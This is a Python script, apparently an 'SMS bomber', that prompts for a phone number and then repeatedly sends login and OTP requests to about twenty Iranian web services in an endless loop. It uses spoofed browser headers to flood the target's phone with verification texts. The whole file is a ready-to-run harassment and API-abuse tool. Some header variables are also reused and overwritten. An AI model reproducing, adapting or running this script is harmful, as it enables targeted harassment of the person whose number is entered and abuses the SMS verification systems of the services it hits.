from colorama.initialise import init
import requests
from requests.api import post, request
import time
import os , platform
from colorama import Fore
import sys
init()
data0 = platform.uname()[0]
if data0 == 'Linux':
    os.system('clear')
else:
    os.system('cls')
print()
print(Fore.YELLOW + '''▒█░▒█ ░▀░ █▀▀█ █▀▀█ █▀▀ █░░█ ░▀░ █▀▄▀█ █▀▀█ 
▒█▀▀█ ▀█▀ █▄▄▀ █░░█ ▀▀█ █▀▀█ ▀█▀ █░▀░█ █▄▄█ 
▒█░▒█ ▀▀▀ ▀░▀▀ ▀▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░░▀ ▀░░▀''')
print()  
print('Created By Tganga36')
print() 
phone = input(Fore.LIGHTGREEN_EX + '[+]' + Fore.LIGHTWHITE_EX + ' Enter Phone Number(09........):')
print()
def bomb():
    nmj = {"UserName":f"{phone}"}
    nmh = {'Host': 'www.namava.ir' , 'Content-Length':'28' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://www.namava.ir/auth/register-phone' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    esh = {'Host': 'app.espard.com' , 'Content-Length':'232' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'fa' , 'Connection':'keep-alive' , 'Content-Type':'application/x-www-form-urlencoded' , 'Referer':'https://join.espard.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    esj = {"data":{"mobile":f"{phone}"},"oneSignalPlayerId":"","appVersion":"999","deviceId":"REGISTER_PRO","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.pro","platform":"3rd","osVersion":"","timeZone":"GMT+3:30","time":""}
    ith = {'Host': 'app.itoll.ir' , 'Content-Length':'24' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'fa' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://itoll.ir/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    itj = {"mobile":f"{phone}"}
    anh = {'Host': 'api2.anten.ir' , 'Content-Length':'23' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://www.anten.ir/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    anj = {"phone":f"{phone}"}
    tah = {'Host': 'tap33.me' , 'Content-Length':'60' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json' , 'Referer':'https://join.tapsi.ir/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    taj = {"credential":{"phoneNumber":f"{phone}","role":"DRIVER"}}
    tgh = {'Host': 'gw.taaghche.com' , 'Content-Length':'25' , 'Accept':'*/*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json' , 'Referer':'https://taaghche.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    tgj = {"contact":f"{phone}"}
    drh = {'Host': 'api.pezeshket.com' , 'Content-Length':'30' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'fa-IR, en;q=0.8, *;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://web.pezeshket.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    drj = {"mobileNumber":f"{phone}"}
    shh = {'Host': 'www.shab.travel' , 'Content-Length':'45' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json' , 'Referer':'https://www.shab.travel/login' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    shj = {"mobile":f"{phone}","country_code":"+98"}
    eeh = {'Host': 'api.snapp.ir' , 'Content-Length':'23' , 'Accept':'*/*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json' , 'Referer':'https://snapp.ir/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    eej = {"phone":f"{phone}"}
    shh = {'Host': 'www.sheypoor.com' , 'Content-Length':'26' , 'Accept':'application/json' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://www.sheypoor.com/session' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    shj = {"username":f"{phone}"}
    mah = {'Host': 'api.behtarino.com' , 'Content-Length':'23' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://marysbakery.ir/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    maj = {"phone":f"{phone}"}
    pih = {'Host': 'pinket.com' , 'Content-Length':'29' , 'Accept':'*/*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=UTF-8' , 'Referer':'https://pinket.com/auth/phoneNumber' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    pij = {"phoneNumber":f"{phone}"}
    dih = {'Host': 'api.timcheh.com' , 'Content-Length':'24' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://timcheh.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    dij = {"mobile":phone}
    oih = {'Host': 'base.darmankade.com' , 'Content-Length':'24' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://www.darmankade.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    oij = {"mobile":phone}
    mah = {'Host': 'api.malichii.com' , 'Content-Length':'24' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.5' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://malichii.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    maj = {"mobile":phone}
    tih = {'Host': 'api.timcheh.com' , 'Content-Length':'24' , 'Accept':'application/json, text/plain, */*' , 'Accept-Encoding' : 'gzip, deflate, br' , 'Accept-Language':'en-US,en;q=0.9,fa;q=0.8' , 'Connection':'keep-alive' , 'Content-Type':'application/json;charset=utf-8' , 'Referer':'https://timcheh.com/' , 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}
    tij = {"mobile":phone}
    while True:
        print(requests.post('https://api.timcheh.com/auth/otp/send' , headers=tih , json=tij))
        print(requests.post('https://base.darmankade.com/v1/PatientLogin' , headers=oih , json=oij))
        print(requests.post('https://api.timcheh.com/auth/otp/send' , headers=dih , json=dij))
        print(requests.post('https://pinket.com/api/cu/v2/phone-verification' , headers=pih , json=pij))
        print(requests.post('https://api.behtarino.com/api/v1/businesses/mqdbicdbmb/vitrin_verification/' , headers=mah , json=maj))
        print(requests.get(f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={phone}&source=2&sendTokenIfNot=true'))
        print(requests.post('https://www.sheypoor.com/api/v10.0.0/auth/send' , headers=shh , json=shj))
        print(requests.post(f'https://www.azki.app/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%22azki_{phone}%22%7D'))
        print(requests.post(f'https://api.snapp.ir/api/v1/sms/link' , headers=eeh , json=eej))
        print(requests.post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={phone}'))
        print(requests.post('https://www.shab.travel/api/fa/sandbox/v_1_4/auth/enter-mobile' , headers=shh , json=shj))
        print(requests.get(f'https://core.gap.im/v1/user/add.json?mobile={phone}'))
        print(requests.post('https://api.pezeshket.com/core/v1/auth/requestCode' , headers=drh , json=drj))
        print(requests.post('https://gw.taaghche.com/v4/site/auth/signup' , headers=tgh , json=tgj))
        print(requests.post('https://tap33.me/api/v2/user' , headers=tah , json=taj))
        print(requests.post('https://api2.anten.ir/users' , headers=anh , json=anj))
        print(requests.post('https://app.itoll.ir/api/v1/auth/login' , headers=ith , json=itj))
        print(requests.post('https://app.espard.com/api/v1/auth/identify-by-mobile' , headers=esh , json=esj))
        print(requests.post('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request' , headers=nmh , json=nmj))
        print(requests.get(f'https://filmnet.ir/api-v2/access-token/users/{phone}/otp'))
        print(requests.get(f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone}/sms?cCode=%2098'))
        

print(Fore.LIGHTGREEN_EX + '[!]' + Fore.LIGHTWHITE_EX + 'Sending...')
bomb()
